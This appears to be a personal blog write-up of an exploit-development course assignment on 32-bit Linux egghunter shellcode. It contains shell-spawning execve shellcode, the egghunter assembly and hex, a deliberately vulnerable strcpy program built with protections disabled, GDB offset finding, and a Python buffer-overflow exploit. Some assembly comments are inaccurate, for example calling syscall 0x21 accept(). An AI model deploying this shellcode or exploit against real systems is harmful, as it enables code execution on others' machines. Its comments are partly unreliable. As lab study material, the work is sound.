---
title: SLAE32 Assignment 3 -- Egghunter Shellcode
date: 2019-9-15
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE32.jpg
tags:
  - egghunter
  - execve
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcode
---
![](/assets/images/SLAE32.png)

```nasm
; Filename: execve-stack.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	xor eax, eax
	push eax
	push 0x68732f2f 	; PUSH //bin/sh (8 bytes) 
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80
```
This is the assembly code of the egghunter I created. It is heavily influenced by Skapes egghunter.  

``nasm
global _start
_start:
        mov ebx, 0x50905090             ; EGG - 0x90 is NOP, 0x50 is push eax. Executable, no consequence instructions
        xor ecx, ecx                    ; Clears the ECX Register.
        mul ecx                                 ; ECX*EAX. Result is stored in EDX:EAX. This clears the EDX and EAX registers
nextPage:                                       ; Increments the memory address stored in EDX by 4096 Bytes (a memory page)
        or dx, 0xfff                    ; 0xfff = 4096. This is the size of Linux Memory pages.
nextAddress:                            ; Increments the memory address stored in EDX by 4 Bytes (a memory address in IA-32 bit)
        inc edx                                 ; in combo with the or dx above, this moves the memory scanner EDX by a page
                                                        ; in combo with the cmp [edx+0x4] below, this aligns EDX so it will scan the next memory address
                                                        ; 4095*2=8190+1=8191.
        ;                                                    (inc edx) 4095+1    (inc edx) 8191+1
        ; or dx when edx is: \x00000000                 \x00001000 = 4096       \x00002000 = 8192
        ;                                        \x00000FFF                     \x00000FFF = 4095        \x00000FFF = 4095
        ;                                        \x00000FFF = 4095  \x00001FFF = 8191   \x00002FFF = 12287
        pusha                                   ; Pushes all 16-bit registers onto the stack
        lea ebx, [edx+0x4]              ; Increments the Memory Address of EDX by 4 Bytes.
                                                        ;  Stores the value stored at EDX+4 into the EBX register
        mov al, 0x21                    ; System Call for accept()
        int 0x80                                ; Executes accept()
        cmp al, 0xf2                    ; The return value of accept() is stored in EAX. Checks if access is denied
        popa                                    ; Pops all 16-bit registers from the stack
        jz nextPage                             ; If page access is denied, check the next memory page
        cmp [edx], ebx                  ;
        jnz nextAddress
        cmp [edx+0x4], ebx
        jnz nextAddress
        jmp edx
```

I then comipled both the egghunter and the execve assembly code.  

```console
nasm -f elf32 eggHunter.nasm -o eggHunter.o
ld eggHunter.o -o eggHunter
nasm -f elf32 execve.nasm -o execve.o
ld execve.o -o execve
```
Once both the programs were compiled I used my object dump bash script to extract the shellcode in hex.

```bash
#!/bin/bash
# Filename: objdump2hex.sh

OBJFILE=$1

objdump -d $(pwd)/${1} | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```

```console
root# ./objdump2hex.sh 
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

root# ./objdump2hex.sh execve
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
```

To combine the egghunter with the shellcode, and to define an egg to hunt for, I created a simple C program.  

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// egg=0x50905090
#define EGG "\x90\x50\x90\x50"

unsigned char egg[] = EGG;
unsigned char egghunter[] = \
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main(){
        printf("Egghunter Length: %d\n", sizeof(egghunter)-1);
        char stack[200];
        printf("Memory location of shellcode: %p\n", stack);
        strcpy(stack, egg);
        strcpy(stack-4, egg);
        strcpy(stack-8, shellcode);

        int (*ret)() = (int(*)())egghunter;
        ret();
}
```


This was the code I used to create a vulnerable C program to use the egghunter exploit on.  

```c
// https://pinkysplanet.net/simple-linux-x86-buffer-overflow/
// Disable ASLR  "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
// Compiled with gcc: gcc -fno-stack-protector -z execstack -no-pie ezbof.c -o ezbof
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void pb(char *buf);

int main(int argc, char **argv)
{
	if (argc < 2)
	{
		printf("%s <string>\n",argv[0]);
		exit(0);
	}
	pb(argv[1]);
	return 0;
}

void pb(char *buf)
{
	char buffer[32];
	strcpy(buffer,buf);
	printf("[+] Buffer: %s\n", buffer);
}
```

After compiling the program I needed to find the offset for the stack buffer overflow.  
I used GDB with the peda plugin to generate a unique sting to overflow the buffer.  

```console
gdb ./ezbof
gdb-peda$ pattern_create 100
  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
  # At time of Crash | EIP: 0x41414641 ('AFAA')
gdb-peda$ pattern_offset 0x41414641
  1094796865 found at offset: 44
gdb-peda$ r `python xploit-ezbof.py`
  # At time of Crash | EIP: 0x37333331 ('1337')
gdb-peda$ info functions
  0x0804848c  pb
gdb-peda$ disassemble pb
  0x080484b9 <+45>:    ret
```

```python 
#!/usr/bin/python
junk = '\x90' * 44
# mov ecx, 0x88888888
# B988888888
#MOV_ECX = '\xb9\x88\x88\x88\x88'
# at time of crash:	ECX: 0x88888888 
#	ESP: 0xbffff4c0 --> 0x888888b9 
#	EIP: 0xbffff4f3 --> 0xfff51c00
#	0000| 0xbffff4c0 --> 0x888888b9 
#	0004| 0xbffff4c4 --> 0x90909088 
#	0008| 0xbffff4c8 --> 0x90909090 

#payload = '\x90' * 46
#EIP = '\x31\x33\x33\x37'
#print junk + EIP + egg
# At time of crash:	ESP: 0xbffff4c0 --> 0x90909090 
#RET = '\xBF\xFF\xF4\xC0'
EIP = '\xc0\xf4\xff\xbf'
#EIP = 0xbffff4c0
# root# ./objdump2hex.sh execve-stack
payload = "\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";


print junk + EIP + payload
```
